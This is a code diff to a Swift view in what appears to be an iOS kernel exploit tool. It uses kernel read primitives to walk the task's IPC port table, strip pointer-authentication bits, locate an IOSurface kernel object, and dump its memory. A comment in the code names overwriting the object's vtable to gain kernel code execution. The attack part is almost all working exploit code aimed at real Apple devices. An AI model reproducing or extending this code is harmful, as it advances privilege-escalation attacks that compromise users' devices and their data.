@@ -313,6 +313,7 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
         let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
         let origUid = ds_kread32(ucred + 0x18)
+        let pmask = pac_mask  // 0xffffff8000000000 on A12
         
         var report = ""
         report += String(format: "proc:     0x%llx\n", proc)
@@ -321,15 +322,7 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         report += String(format: "ucred:    0x%llx\n", ucred)
         report += String(format: "orig uid: %d\n", origUid)
         report += String(format: "surface:  ID=%d\n", engine.surfaceID)
-        report += String(format: "pac_mask: 0x%llx\n\n", pac_mask)
-        
-        // ============================================================
-        // SAFE EXPERIMENT: Scan heap near proc/task for IOSurface ID
-        // Only read from addresses we KNOW are valid (near proc/task)
-        // No IPC port table scan (that caused crash)
-        // ============================================================
-        
-        report += "=== SCANNING HEAP FOR SURFACE ID=%d ===\n\n" 
+        report += String(format: "pac_mask: 0x%llx\n\n", pmask)
         
         guard engine.surfaceID != 0 else {
             report += "Surface ID is 0 — open IOSurfaceRoot first.\n"
@@ -338,61 +331,86 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         }
         
         let targetID = engine.surfaceID
-        var foundAddr: UInt64 = 0
         
-        // Scan ±8KB around proc (known valid heap)
-        report += "Scanning proc ± 8KB...\n"
-        let procBase = proc > 0x2000 ? proc - 0x2000 : proc
-        for off in stride(from: 0, to: 0x4000, by: 4) {
-            let addr = procBase + UInt64(off)
-            let val = ds_kread32(addr)
-            if val == targetID {
-                report += String(format: "  HIT at 0x%llx (proc%+d)\n", addr, Int64(addr) - Int64(proc))
-                if foundAddr == 0 { foundAddr = addr }
-            }
+        // ============================================================
+        // SCAN IPC PORT TABLE (with proper PAC stripping)
+        // ============================================================
+        
+        report += "=== SCANNING IPC PORT TABLE ===\n"
+        
+        let itkSpace = ds_kread64(task + UInt64(off_task_itk_space))
+        let isTable: UInt64
+        if pmask != 0 {
+            isTable = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table)) | pmask
+        } else {
+            isTable = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
         }
         
-        // Scan ±8KB around task
-        if foundAddr == 0 {
-            report += "Scanning task ± 8KB...\n"
-            let taskBase = task > 0x2000 ? task - 0x2000 : task
-            for off in stride(from: 0, to: 0x4000, by: 4) {
-                let addr = taskBase + UInt64(off)
-                let val = ds_kread32(addr)
+        report += String(format: "itk_space: 0x%llx\n", itkSpace)
+        report += String(format: "is_table:  0x%llx\n\n", isTable)
+        
+        guard ds_isvalid(isTable) else {
+            report += "is_table invalid, skipping port scan.\n"
+            rootResult = report
+            return
+        }
+        
+        let entrySize = UInt64(sizeof_ipc_entry)
+        var foundKobject: UInt64 = 0
+        var foundPortIdx = -1
+        
+        for i in 1..<300 {  // Skip entry 0 (null)
+            let entryAddr = isTable + UInt64(i) * entrySize
+            let rawPtr = ds_kread64(entryAddr + UInt64(off_ipc_entry_ie_object))
+            if rawPtr == 0 { continue }
+            
+            // Strip PAC from port pointer
+            let port = rawPtr | pmask
+            if !ds_isvalid(port) { continue }
+            
+            // Read kobject pointer from port
+            let rawKobj = ds_kread64(port + UInt64(off_ipc_port_ip_kobject))
+            if rawKobj == 0 { continue }
+            
+            // Strip PAC from kobject
+            let kobj = rawKobj | pmask
+            if !ds_isvalid(kobj) { continue }
+            
+            // Search for our surface ID in this object
+            for off in stride(from: 0, to: 0x60, by: 4) {
+                let val = ds_kread32(kobj + UInt64(off))
                 if val == targetID {
-                    report += String(format: "  HIT at 0x%llx (task%+d)\n", addr, Int64(addr) - Int64(task))
-                    if foundAddr == 0 { foundAddr = addr }
+                    foundKobject = kobj
+                    foundPortIdx = i
+                    report += String(format: "FOUND! port[%d] kobject=0x%llx (ID at +0x%x)\n", i, kobj, off)
+                    break
                 }
             }
+            if foundKobject != 0 { break }
+        }
+        
+        if foundKobject == 0 {
+            report += "Surface ID=\(targetID) not found in 300 port entries.\n"
+            report += "IOSurface may use a different port or lookup method.\n"
         }
         
         // ============================================================
-        // If found: dump surrounding structure
+        // DUMP OBJECT if found
         // ============================================================
         
-        if foundAddr != 0 {
-            // Align to 0x10 boundary and go back 0x40 to find object start
-            let objStart = (foundAddr & ~0xF) - 0x40
-            report += String(format: "\n=== OBJECT DUMP near 0x%llx ===\n", foundAddr)
-            
+        if foundKobject != 0 {
+            report += String(format: "\n=== IOSURFACE OBJECT at 0x%llx ===\n", foundKobject)
             for i in stride(from: 0, to: 0xC0, by: 8) {
-                let addr = objStart + UInt64(i)
-                let val = ds_kread64(addr)
+                let val = ds_kread64(foundKobject + UInt64(i))
                 var marker = ""
-                if addr == foundAddr || addr == foundAddr - 4 { marker = " ← ID here" }
-                if i == 0 { marker = " ← possible vtable" }
-                report += String(format: "  0x%llx (+0x%02x): 0x%016llx%@\n", addr, i, val, marker)
+                if i == 0 { marker = " ← vtable" }
+                else if UInt32(val & 0xFFFFFFFF) == targetID { marker = " ← ID" }
+                report += String(format: "  +0x%02x: 0x%016llx%@\n", i, val, marker)
             }
-            
-            report += "\n→ First qword is likely vtable pointer\n"
-            report += "→ Next step: identify vtable, find overwritable entry\n"
-        } else {
-            report += "\nSurface ID not found near proc/task.\n"
-            report += "IOSurface object may be in different heap zone.\n"
-            report += "Try: scan rw_pcb area or broader range.\n"
+            report += "\n→ vtable at +0x00 can be overwritten for code exec\n"
         }
         
-        report += "\n=== DONE (no writes, safe scan) ===\n"
+        report += "\n=== DONE ===\n"
         rootResult = report
     }
 }
